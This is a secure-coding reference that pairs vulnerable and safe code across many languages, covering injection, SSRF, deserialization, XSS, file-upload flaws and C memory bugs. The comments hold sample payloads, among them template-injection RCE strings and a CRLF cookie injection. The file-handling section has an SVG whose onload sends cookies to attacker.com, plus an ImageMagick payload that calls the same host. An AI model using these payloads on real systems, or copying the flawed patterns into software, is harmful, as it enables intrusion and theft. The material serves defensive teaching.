# Consolidated Vulnerability Patterns by Category

---

## 1. SQL Injection

### Python (SQLite / psycopg2 / MySQLdb)

**Vulnerable -- f-string interpolation:**
```python
def get_user(username):
    cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
    return cursor.fetchone()
```

**Vulnerable -- string concatenation:**
```python
def search_products(keyword):
    query = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'"
    cursor.execute(query)
```

**Vulnerable -- .format():**
```python
def get_order(order_id):
    cursor.execute("SELECT * FROM orders WHERE id = {}".format(order_id))
```

**Safe -- parameterized query:**
```python
def get_user(username):
    cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
    return cursor.fetchone()
```

**Safe -- ORM (Django):**
```python
User.objects.filter(username=username)  # Safe: Django ORM escapes automatically
```

**Vulnerable -- Django ORM raw() bypass:**
```python
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")  # UNSAFE
User.objects.raw("SELECT * FROM users WHERE username = %s", [username])  # Safe
```

### JavaScript / Node.js (mysql2, pg, sequelize)

**Vulnerable -- template literal:**
```javascript
const result = await pool.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
```

**Vulnerable -- string concatenation:**
```javascript
db.query("SELECT * FROM users WHERE email = '" + req.body.email + "'", callback);
```

**Vulnerable -- Sequelize literal() misuse:**
```javascript
User.findAll({ where: sequelize.literal(`username = '${req.body.username}'`) });
```

**Safe -- parameterized:**
```javascript
const result = await pool.query("SELECT * FROM users WHERE id = $1", [req.params.id]);
db.query("SELECT * FROM users WHERE email = ?", [req.body.email], callback);
```

**Safe -- Sequelize ORM:**
```javascript
User.findAll({ where: { email: req.body.email } }); // Safe
```

### Java (JDBC)

**Vulnerable -- Statement.execute with concatenation:**
```java
String query = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**Vulnerable -- createNativeQuery:**
```java
String query = "SELECT * FROM User u WHERE u.username = '" + username + "'";
entityManager.createNativeQuery(query, User.class).getResultList();
```

**Safe -- PreparedStatement:**
```java
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setString(1, username);
ResultSet rs = pstmt.executeQuery();
```

**Safe -- JPA JPQL with named parameters:**
```java
TypedQuery<User> q = em.createQuery("SELECT u FROM User u WHERE u.username = :name", User.class);
q.setParameter("name", username);
```

### PHP (PDO / MySQLi)

**Vulnerable -- direct interpolation:**
```php
$result = mysqli_query($conn, "SELECT * FROM users WHERE username = '$username'");
$result = $pdo->query("SELECT * FROM users WHERE id = " . $_GET['id']);
```

**Safe -- PDO prepared statement:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

**Safe -- MySQLi prepared statement:**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
```

### Go (database/sql)

**Vulnerable:**
```go
rows, err := db.Query("SELECT * FROM users WHERE name = '" + name + "'")
rows, err := db.Query(fmt.Sprintf("SELECT * FROM users WHERE id = %s", id))
```

**Safe:**
```go
rows, err := db.Query("SELECT * FROM users WHERE name = ?", name)
rows, err := db.Query("SELECT * FROM users WHERE id = $1", id)
```

### Ruby (ActiveRecord)

**Vulnerable -- string interpolation in where():**
```ruby
User.where("username = '#{params[:username]}'")
User.where("id = " + params[:id])
User.find_by_sql("SELECT * FROM users WHERE name = '#{name}'")
```

**Safe:**
```ruby
User.where(username: params[:username])
User.where("username = ?", params[:username])
User.where("username = :name", name: params[:username])
```

### C# (ADO.NET / Entity Framework)

**Vulnerable:**
```csharp
string query = "SELECT * FROM Users WHERE Username = '" + username + "'";
SqlCommand cmd = new SqlCommand(query, conn);
```

**Vulnerable -- EF raw query:**
```csharp
context.Users.FromSqlRaw($"SELECT * FROM Users WHERE Username = '{username}'");
```

**Safe:**
```csharp
SqlCommand cmd = new SqlCommand("SELECT * FROM Users WHERE Username = @username", conn);
cmd.Parameters.AddWithValue("@username", username);
```

**Safe -- EF with parameterized:**
```csharp
context.Users.FromSqlRaw("SELECT * FROM Users WHERE Username = {0}", username);
context.Users.Where(u => u.Username == username); // ORM safe
```

---

## 2. NoSQL Injection (MongoDB)

### JavaScript / Node.js (mongoose)

**Vulnerable -- direct object spread from request body:**
```javascript
// POST /login body: {"username": {"$ne": null}, "password": {"$ne": null}}
const user = await User.findOne({ username: req.body.username, password: req.body.password });
```

**Vulnerable -- $where with user input:**
```javascript
db.collection('users').find({ $where: `this.username == '${username}'` });
```

**Vulnerable -- aggregate with user-controlled pipeline:**
```javascript
const pipeline = JSON.parse(req.body.pipeline);
db.collection('orders').aggregate(pipeline);
```

**Safe -- explicit field extraction + type checking:**
```javascript
const username = String(req.body.username);
const password = String(req.body.password);
const user = await User.findOne({ username, password });
```

### Python (pymongo)

**Vulnerable:**
```python
user = db.users.find_one({"username": request.json.get("username"),
                           "password": request.json.get("password")})
```

**Safe -- explicit string casting:**
```python
username = str(request.json.get("username", ""))
password = str(request.json.get("password", ""))
user = db.users.find_one({"username": username, "password": password})
```

---

## 3. OS Command Injection

### Python

**Vulnerable -- shell=True with f-string:**
```python
def ping_host(hostname):
    result = subprocess.run(f"ping -c 4 {hostname}", shell=True, capture_output=True)
    return result.stdout

def convert_image(filename):
    os.system(f"convert {filename} output.png")
```

**Vulnerable -- popen with user input:**
```python
output = os.popen(f"whois {domain}").read()
```

**Safe -- list form without shell=True:**
```python
def ping_host(hostname):
    if not re.match(r'^[a-zA-Z0-9.\-]+$', hostname):
        raise ValueError("Invalid hostname")
    result = subprocess.run(["ping", "-c", "4", hostname], capture_output=True)
    return result.stdout
```

**Safe -- shlex.quote for shell=True when unavoidable:**
```python
import shlex
result = subprocess.run(f"ping -c 4 {shlex.quote(hostname)}", shell=True)
```

### JavaScript / Node.js

**Vulnerable -- exec with template literal:**
```javascript
const { exec } = require('child_process');
exec(`ls -la ${req.query.path}`, (err, stdout) => res.send(stdout));
```

**Safe -- execFile (no shell interpretation):**
```javascript
const { execFile } = require('child_process');
execFile('ls', ['-la', req.query.path], (err, stdout) => res.send(stdout));
```

**Safe -- spawn with array args:**
```javascript
const { spawn } = require('child_process');
const ls = spawn('ls', ['-la', userPath]);
```

### Java

**Vulnerable -- ProcessBuilder with shell:**
```java
ProcessBuilder pb = new ProcessBuilder("sh", "-c", "ping -c 4 " + hostname);
```

**Safe -- ProcessBuilder with argument array:**
```java
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", hostname);
pb.redirectErrorStream(true);
Process p = pb.start();
```

### PHP

**Vulnerable:**
```php
$output = shell_exec("ping -c 4 " . $_GET['host']);
$output = system("whois " . $domain);
echo `convert {$_FILES['file']['name']} output.png`;
```

**Safe:**
```php
$host = escapeshellarg($_GET['host']);
$output = shell_exec("ping -c 4 " . $host);
```

### Go

**Vulnerable:**
```go
cmd := exec.Command("sh", "-c", "ping -c 4 " + hostname)
```

**Safe:**
```go
cmd := exec.Command("ping", "-c", "4", hostname)
out, err := cmd.Output()
```

### Ruby

**Vulnerable:**
```ruby
`ping -c 4 #{params[:host]}`
system("convert #{filename} output.png")
```

**Safe:**
```ruby
system("ping", "-c", "4", params[:host])  # Array form, no shell
```

---

## 4. Path Traversal / Arbitrary File Read

### Python (Flask)

**Vulnerable:**
```python
@app.route('/download')
def download_file():
    filename = request.args.get('file')
    return send_file(f"/var/www/uploads/{filename}")
```

**Safe -- realpath check:**
```python
UPLOAD_DIR = "/var/www/uploads"

@app.route('/download')
def download_file():
    filename = request.args.get('file')
    safe_path = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
    if not safe_path.startswith(UPLOAD_DIR + os.sep):
        abort(403)
    return send_file(safe_path)
```

**Safe -- Flask send_from_directory:**
```python
from flask import send_from_directory

@app.route('/download/<filename>')
def download_file(filename):
    return send_from_directory('/var/www/uploads', filename)
```

### JavaScript / Node.js

**Vulnerable:**
```javascript
app.get('/file', (req, res) => {
    const filePath = path.join(__dirname, 'public', req.query.name);
    fs.readFile(filePath, (err, data) => res.send(data));
});
```

**Safe:**
```javascript
app.get('/file', (req, res) => {
    const base = path.resolve(__dirname, 'public');
    const requested = path.resolve(base, req.query.name);
    if (!requested.startsWith(base + path.sep)) {
        return res.status(403).send('Forbidden');
    }
    fs.readFile(requested, (err, data) => res.send(data));
});
```

### Java (Spring)

**Vulnerable:**
```java
@GetMapping("/download")
public ResponseEntity<Resource> download(@RequestParam String filename) throws IOException {
    Path file = Paths.get("/uploads/" + filename);
    Resource resource = new FileSystemResource(file);
    return ResponseEntity.ok().body(resource);
}
```

**Safe:**
```java
@GetMapping("/download")
public ResponseEntity<Resource> download(@RequestParam String filename) throws IOException {
    Path base = Paths.get("/uploads").toRealPath();
    Path file = base.resolve(filename).normalize().toRealPath();
    if (!file.startsWith(base)) {
        throw new AccessDeniedException("Path traversal detected");
    }
    Resource resource = new FileSystemResource(file);
    return ResponseEntity.ok().body(resource);
}
```

### PHP

**Vulnerable:**
```php
$file = $_GET['page'];
include("pages/" . $file . ".php");
$content = file_get_contents("/var/www/uploads/" . $_GET['file']);
```

**Safe:**
```php
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (!in_array($page, $allowed, true)) {
    die("Page not found");
}
include("pages/" . $page . ".php");
```

---

## 5. SSTI (Server-Side Template Injection)

### Python (Jinja2 / Flask)

**Vulnerable -- render_template_string with user input:**
```python
@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)
# Payload: {{7*7}} renders 49
# RCE: {{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Vulnerable -- Template() with user input:**
```python
from jinja2 import Template
t = Template(user_template)  # UNSAFE
return t.render(name="World")
```

**Safe -- pass user data as variables:**
```python
return render_template('greet.html', name=name)  # name is a variable, not template
```

### JavaScript / Node.js (EJS, Nunjucks)

**Vulnerable -- EJS with user-controlled template:**
```javascript
const output = ejs.render(req.query.template, { user: req.user });
```

**Safe:**
```javascript
res.render('greet.ejs', { name: req.query.name });  // greet.ejs is a static file
```

### Java (FreeMarker, SpEL)

**Vulnerable -- FreeMarker with user template string:**
```java
Template t = new Template("name", new StringReader(userInput), cfg);
// Payload: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Vulnerable -- SpEL injection:**
```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);  // RCE via SpEL
```

**Safe:**
```java
Template t = cfg.getTemplate("fixed-template.ftl");  // Static template file
t.process(dataModel, out);
```

---

## 6. LDAP Injection

### Python (ldap3)

**Vulnerable:**
```python
search_filter = f"(&(uid={username})(userPassword={password}))"
conn.search('dc=example,dc=com', search_filter)
```

**Safe:**
```python
from ldap3.utils.conv import escape_filter_chars
safe_username = escape_filter_chars(username)
search_filter = f"(&(uid={safe_username})(userPassword={safe_password}))"
```

### Java (javax.naming)

**Vulnerable:**
```java
String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";
NamingEnumeration results = ctx.search("dc=example,dc=com", filter, controls);
```

**Safe:**
```java
String filter = "(&(uid={0})(userPassword={1}))";
Object[] filterArgs = { username, password };
NamingEnumeration results = ctx.search("dc=example,dc=com", filter, filterArgs, controls);
```

---

## 7. Header / CRLF Injection

### Python (Flask / Django)

**Vulnerable -- user input in redirect location:**
```python
response.headers['Location'] = request.args.get('next')
# Payload: /redirect?next=https://evil.com%0d%0aSet-Cookie:%20session=hijacked
```

**Safe:**
```python
url = url.replace('\r', '').replace('\n', '')
return redirect(url)
```

### PHP

**Vulnerable:**
```php
header("Location: " . $_GET['url']);
```

**Safe:**
```php
$url = filter_var($_GET['url'], FILTER_VALIDATE_URL);
if ($url === false) { $url = '/'; }
header("Location: " . $url);
```

---

## 8. SSRF (Server-Side Request Forgery)

### Python (requests / httpx / urllib)

**Vulnerable -- direct user URL passed to requests:**
```python
@app.route('/preview')
def preview_url():
    url = request.args.get('url')
    resp = requests.get(url)  # CRITICAL SSRF
    return resp.text
```

**Vulnerable -- webhook test/ping:**
```python
@app.route('/webhook/test', methods=['POST'])
def test_webhook():
    webhook_url = request.json.get('url')
    requests.post(webhook_url, json={'test': True})  # SSRF via webhook
```

**Vulnerable -- stored URL (second-order SSRF):**
```python
def trigger_webhook(webhook_id, event_data):
    webhook = Webhook.objects.get(id=webhook_id)
    requests.post(webhook.url, json=event_data)  # SSRF here
```

**Vulnerable -- weak URL validation (blocklist bypass):**
```python
def fetch_url(url):
    blocked = ['localhost', '127.0.0.1', '169.254.169.254']
    parsed = urlparse(url)
    if any(b in parsed.netloc for b in blocked):
        raise ValueError("URL not allowed")
    # Bypass: http://0177.0.0.1/, http://[::1]/, http://2130706433/
    return requests.get(url)
```

**Safe -- strict allowlist validation:**
```python
import ipaddress, socket
from urllib.parse import urlparse

ALLOWED_SCHEMES = {'https', 'http'}
ALLOWED_DOMAINS = {'api.trusted-partner.com'}

def safe_fetch(url: str) -> requests.Response:
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError(f"Scheme not allowed: {parsed.scheme}")
    hostname = parsed.hostname
    if hostname not in ALLOWED_DOMAINS:
        raise ValueError(f"Domain not in allowlist: {hostname}")
    ip = socket.gethostbyname(hostname)
    addr = ipaddress.ip_address(ip)
    if addr.is_private or addr.is_loopback or addr.is_link_local:
        raise ValueError(f"Resolved to private IP: {ip}")
    return requests.get(url, allow_redirects=False, timeout=5)
```

### Node.js / Express

**Vulnerable:**
```javascript
app.get('/api/proxy', async (req, res) => {
    const { url } = req.query;
    const response = await axios.get(url);  // SSRF
    res.send(response.data);
});
```

### Java / Spring Boot

**Vulnerable -- RestTemplate with user URL:**
```java
@GetMapping("/fetch")
public String fetchContent(@RequestParam String url) {
    RestTemplate restTemplate = new RestTemplate();
    return restTemplate.getForObject(url, String.class);  // SSRF
}
```

### Go

**Vulnerable:**
```go
func FetchHandler(w http.ResponseWriter, r *http.Request) {
    url := r.URL.Query().Get("url")
    resp, err := http.Get(url)  // SSRF
    io.Copy(w, resp.Body)
}
```

### PHP

**Vulnerable:**
```php
$url = $_GET['url'];
$content = file_get_contents($url);  // SSRF + also supports file://, ftp://
```

### Document Rendering Engines (wkhtmltopdf / Puppeteer)

**Vulnerable -- user HTML rendered to PDF:**
```python
@app.route('/export/pdf', methods=['POST'])
def export_pdf():
    html_content = request.json.get('html')
    # User controls HTML: <iframe src="http://169.254.169.254/latest/meta-data/">
    pdf = pdfkit.from_string(html_content, False)
    return send_file(BytesIO(pdf), mimetype='application/pdf')
```

**Vulnerable -- Puppeteer URL navigation:**
```javascript
app.post('/screenshot', async (req, res) => {
    const { url } = req.body;
    const page = await browser.newPage();
    await page.goto(url);  // SSRF
    const screenshot = await page.screenshot();
    res.send(screenshot);
});
```

### XML / SVG Processing (SSRF via XXE)

**Vulnerable -- lxml without DTD restriction:**
```python
root = etree.fromstring(xml_data)  # SSRF if XML contains ENTITY referencing URL
```

**Safe -- disable external entity resolution:**
```python
parser = etree.XMLParser(
    resolve_entities=False, no_network=True, load_dtd=False, forbid_dtd=True
)
return etree.fromstring(xml_data, parser=parser)
```

### URL Validation Anti-Patterns

**DNS Rebinding Bypass:**
```python
# Vulnerable: checks hostname once but DNS may change before actual request
def validate_url(url):
    hostname = urlparse(url).hostname
    ip = socket.gethostbyname(hostname)  # DNS lookup #1
    if ipaddress.ip_address(ip).is_private:
        raise ValueError("Private IP not allowed")
    response = requests.get(url)  # DNS lookup #2 (may resolve to 127.0.0.1 now!)
    return response
```

**Safe -- resolve, validate, then connect to the IP directly:**
```python
def safe_fetch(url: str) -> str:
    parsed = urlparse(url)
    hostname = parsed.hostname
    ip = socket.gethostbyname(hostname)
    addr = ipaddress.ip_address(ip)
    if addr.is_private or addr.is_loopback or addr.is_link_local:
        raise ValueError(f"Resolved to private IP: {ip}")
    safe_url = url.replace(hostname, ip, 1)
    return requests.get(safe_url, headers={'Host': hostname},
                        allow_redirects=False, timeout=5).text
```

---

## 9. Insecure Deserialization

### Python -- pickle

**Vulnerable:**
```python
data = base64.b64decode(request.cookies.get('session'))
obj = pickle.loads(data)  # RCE via __reduce__
```

**Safe:**
```python
data = json.loads(request.cookies.get('session'))  # Use JSON instead
```

### Python -- yaml.load

**Vulnerable:**
```python
config = yaml.load(user_input)  # allows !!python/object/apply: os.system
```

**Safe:**
```python
config = yaml.safe_load(user_input)  # SafeLoader disables object construction
```

### Java -- ObjectInputStream

**Vulnerable:**
```java
ObjectInputStream ois = new ObjectInputStream(req.getInputStream());
Object obj = ois.readObject();  # CRITICAL if gadget libs in classpath
```

### Java -- XStream

**Vulnerable (< 1.4.20 without security framework):**
```java
XStream xstream = new XStream();
Object obj = xstream.fromXML(userInput);  # CRITICAL
```

**Safe:**
```java
XStream xstream = new XStream();
xstream.addPermission(NoTypePermission.NONE);
xstream.addPermission(new ExplicitTypePermission(new Class[]{MyDto.class}));
```

### Java -- DocumentBuilderFactory (XXE)

**Vulnerable:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
Document doc = dbf.newDocumentBuilder().parse(new InputSource(new StringReader(userXml)));
```

**Safe:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### PHP -- unserialize

**Vulnerable:**
```php
$obj = unserialize(base64_decode($_COOKIE['user_session']));  # PHP object injection
```

**Safe:**
```php
$data = json_decode($_POST['data'], true);  // Use JSON
// If you must: $obj = unserialize($data, ['allowed_classes' => ['SafeClass']]);
```

### Ruby -- Marshal.load

**Vulnerable:**
```ruby
obj = Marshal.load(Base64.decode64(cookies[:session]))  # Arbitrary object instantiation
```

### Ruby -- YAML.load (Psych < 4.0)

**Vulnerable (Ruby < 3.1):**
```ruby
config = YAML.load(params[:config])  # !!ruby/object injection
```

**Safe:**
```ruby
config = YAML.safe_load(params[:config])
```

### .NET -- BinaryFormatter

**Vulnerable (deprecated in .NET 5+):**
```csharp
BinaryFormatter formatter = new BinaryFormatter();
var obj = formatter.Deserialize(stream);  # CRITICAL gadget chain RCE
```

### .NET -- JSON TypeNameHandling

**Vulnerable:**
```csharp
var settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All };
var obj = JsonConvert.DeserializeObject(userJson, settings);  # CRITICAL
```

**Safe:**
```csharp
var obj = JsonSerializer.Deserialize<MyDto>(userJson);  // System.Text.Json
```

### Node.js -- node-serialize

**Vulnerable:**
```javascript
const obj = serialize.unserialize(req.body.data);  # CRITICAL -- function injection
```

**Safe:**
```javascript
const obj = JSON.parse(req.body.data);  // No function support
```

---

## 10. XSS (Cross-Site Scripting)

### Python / Jinja2 / Flask

**Vulnerable -- Markup / mark_safe:**
```python
return render_template_string(
    '<div>Hello {{ name }}</div>',
    name=Markup(username)  # CRITICAL -- auto-escape bypassed
)
```

**Vulnerable -- Jinja2 | safe filter:**
```html
<div class="comment">{{ comment.body | safe }}</div>
```

**Safe -- default Jinja2 auto-escape:**
```html
<div>{{ user_input }}</div>
```

### PHP

**Vulnerable -- direct echo without escaping:**
```php
echo $_GET['search'];
echo sprintf('<div>%s</div>', $_GET['name']);
```

**Safe -- htmlspecialchars:**
```php
echo htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8');
```

### Go -- text/template vs html/template

**Vulnerable -- text/template (no auto-escape):**
```go
import "text/template"
tmpl := template.Must(template.New("").Parse(`<div>Hello {{.}}</div>`))
tmpl.Execute(w, name)  # CRITICAL -- no escaping
```

**Vulnerable -- template.HTML cast:**
```go
import "html/template"
Content: template.HTML(userInput)  # HIGH -- escaping bypassed
```

**Safe -- html/template:**
```go
import "html/template"
tmpl.Execute(w, name)  # auto-escapes
```

### React

**Vulnerable -- dangerouslySetInnerHTML:**
```jsx
function Comment({ body }) {
    return <div dangerouslySetInnerHTML={{ __html: body }} />;
}
```

**Safe -- JSX text interpolation:**
```jsx
function Comment({ body }) {
    return <div>{body}</div>;  // auto-escaped
}
```

### Vue.js

**Vulnerable -- v-html directive:**
```html
<div v-html="userComment"></div>
```

**Safe -- double curly braces:**
```html
<div>{{ userComment }}</div>
```

### Angular

**Vulnerable -- bypassSecurityTrustHtml:**
```typescript
this.safeContent = this.sanitizer.bypassSecurityTrustHtml(bio);
```

### JavaScript -- DOM XSS Source-to-Sink Chains

**Vulnerable -- location.hash to innerHTML:**
```javascript
document.getElementById('content').innerHTML = decodeURIComponent(location.hash.slice(1));
```

**Vulnerable -- jQuery .html():**
```javascript
$('#output').html(location.hash.slice(1));
```

**Safe -- textContent:**
```javascript
document.getElementById('content').textContent = location.hash.slice(1);
```

### AngularJS (Legacy) -- Client-Side Template Injection

**Vulnerable:**
```html
<div ng-app>
    <p>Hello, {{ userParam }}</p>
    <!-- Payload: {{constructor.constructor('alert(1)')()}} -->
</div>
```

### Unsafe Markdown Rendering

**Vulnerable -- marked() without sanitization:**
```javascript
return { __html: marked(markdown) };  // Allows <script> tags
```

**Safe -- marked() with DOMPurify:**
```javascript
const clean = DOMPurify.sanitize(marked(markdown), {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title']
});
```

---

## 11. File Handling Vulnerabilities

### Zip Slip -- extractall without path check

**Vulnerable (Python):**
```python
with zipfile.ZipFile(zip_path, 'r') as zf:
    zf.extractall(dest_dir)  # zip entry "../../etc/cron.d/evil" writes outside dest_dir
```

**Safe:**
```python
def safe_extract(zip_path, dest_dir):
    dest_dir = os.path.abspath(dest_dir)
    with zipfile.ZipFile(zip_path, 'r') as zf:
        for member in zf.namelist():
            member_path = os.path.abspath(os.path.join(dest_dir, member))
            if not member_path.startswith(dest_dir + os.sep):
                raise ValueError(f"Zip slip detected: {member}")
            zf.extract(member, dest_dir)
```

**Vulnerable (Java):**
```java
File file = new File(destDir, entry.getName());  # entry.getName() = "../../etc/passwd"
Files.copy(is, file.toPath(), StandardCopyOption.REPLACE_EXISTING);
```

**Safe (Java):**
```java
String canonicalDest = destDir.getCanonicalPath() + File.separator;
String canonicalFile = file.getCanonicalPath();
if (!canonicalFile.startsWith(canonicalDest)) {
    throw new SecurityException("Zip slip detected: " + entry.getName());
}
```

### Tar Slip -- tarfile.extractall (Python < 3.12)

**Vulnerable:**
```python
with tarfile.open('archive.tar.gz', 'r:gz') as tf:
    tf.extractall('/var/uploads/')  # follows symlinks and absolute paths
```

**Safe (Python 3.12+):**
```python
tf.extractall('/var/uploads/', filter='data')
```

### Extension-Only Validation (Bypassable)

**Vulnerable:**
```python
ext = os.path.splitext(f.filename)[1].lower()
if ext not in ALLOWED_EXTENSIONS:
    return "Invalid file type"
f.save(os.path.join(UPLOAD_FOLDER, f.filename))
# Bypass: "shell.php.jpg" on some servers
```

**Safe -- check magic bytes:**
```python
import magic
mime = magic.from_buffer(data, mime=True)
if mime not in {'image/jpeg', 'image/png', 'image/gif'}:
    return "Invalid file type"
filename = werkzeug.utils.secure_filename(f.filename)
```

### SVG XSS -- Uploaded SVG served same-origin

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/steal?c='+document.cookie)">
  <circle cx="50" cy="50" r="50" fill="red"/>
</svg>
```

Exploitable when: served from same origin, Content-Type is `image/svg+xml`, no `Content-Disposition: attachment`.

### ImageMagick Processing Without Policy

**Vulnerable:**
```python
subprocess.run(['convert', input_path, output_path], check=True)
# Attacker uploads MVG payload with: fill 'url(https://attacker.com/|id)'
```

### PHP File Upload Bypass

```php
// VULNERABLE: checks MIME type from $_FILES (user-controlled)
if ($_FILES['file']['type'] === 'image/jpeg') {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}
// Bypass: set Content-Type: image/jpeg for a PHP file
```

### Temporary File Race (Python)

**Vulnerable:**
```python
tmp_path = tempfile.mktemp(suffix='.py')  # TOCTOU: filename returned but file not created
with open(tmp_path, 'w') as f:
    f.write(user_code)
```

**Safe:**
```python
fd, tmp_path = tempfile.mkstemp(suffix='.py')  # Atomically creates AND opens file
with os.fdopen(fd, 'w') as f:
    f.write(user_code)
```

---

## 12. Memory Corruption (C/C++)

### Stack Buffer Overflow

**Vulnerable -- strcpy with fixed buffer:**
```c
void handle_username(char *input) {
    char buf[64];
    strcpy(buf, input);  // overflow if input > 63 bytes
}
```

**Vulnerable -- gets() (never safe):**
```c
char name[32];
gets(name);  # CRITICAL: reads until newline with NO length limit
```

**Vulnerable -- sprintf into fixed buffer:**
```c
char path[256];
sprintf(path, "/var/www/uploads/%s", filename);
```

**Safe alternatives:**
```c
strncpy(buf, input, sizeof(buf) - 1); buf[sizeof(buf) - 1] = '\0';
snprintf(path, sizeof(path), "/var/www/uploads/%s", filename);
fgets(name, sizeof(name), stdin);
```

### Heap Buffer Overflow

**Vulnerable -- malloc without overflow check on size:**
```c
int *records = malloc(count * sizeof(int));  // integer overflow wraps to small value
for (int i = 0; i < count; i++) {
    records[i] = read_record();  // writes past allocation
}
```

**Vulnerable -- memcpy with user-controlled length:**
```c
uint8_t *buf = malloc(256);
size_t data_len = *(uint32_t *)(pkt + 4);  // length from packet header
memcpy(buf, pkt + 8, data_len);  # CRITICAL: data_len not checked against 256
```

**Safe:**
```c
if (count > SIZE_MAX / sizeof(int)) return ERROR_OVERFLOW;
int *records = calloc(count, sizeof(int));  // calloc checks overflow internally
```

### Format String Vulnerability

**Vulnerable:**
```c
printf(user_message);     // CRITICAL: allows %n, %x, etc.
syslog(LOG_ERR, user_message);
```

**Safe:**
```c
printf("%s", user_message);
```

### Use-After-Free (UAF)

**Vulnerable:**
```c
void process_request(struct request *req) {
    char *buf = malloc(req->size);
    if (parse_request(buf, req) < 0) {
        free(buf);  // falls through to use of buf
    }
    send_response(buf, req->size);  // UAF if parse_request failed
}
```

**Safe:**
```c
free(buf);
buf = NULL;  // null dereference instead of exploitable UAF
```

### Double Free

**Vulnerable:**
```c
if (do_work(buf) < 0) {
    free(buf);      // first free
    goto error;
}
return buf;
error:
    free(buf);      // second free -- double free
    return NULL;
```

**Safe -- single cleanup path:**
```c
done:
    free(buf);  // single free point
    return result;
```

### Out-of-Bounds Array Access

**Vulnerable:**
```c
char *lookup_record(int user_index) {
    static char *records[MAX_RECORDS];
    return records[user_index];  // OOB if index unchecked
}
```

**Safe:**
```c
if (user_index < 0 || user_index >= MAX_RECORDS) return NULL;
return records[user_index];
```

### Unsafe Rust Patterns

**Vulnerable:**
```rust
unsafe {
    *ptr.add(user_offset) = value;  // OOB write if user_offset >= buffer.len()
}
```

**Safe:**
```rust
if let Some(elem) = buffer.get_mut(user_offset) {
    *elem = value;
}
```
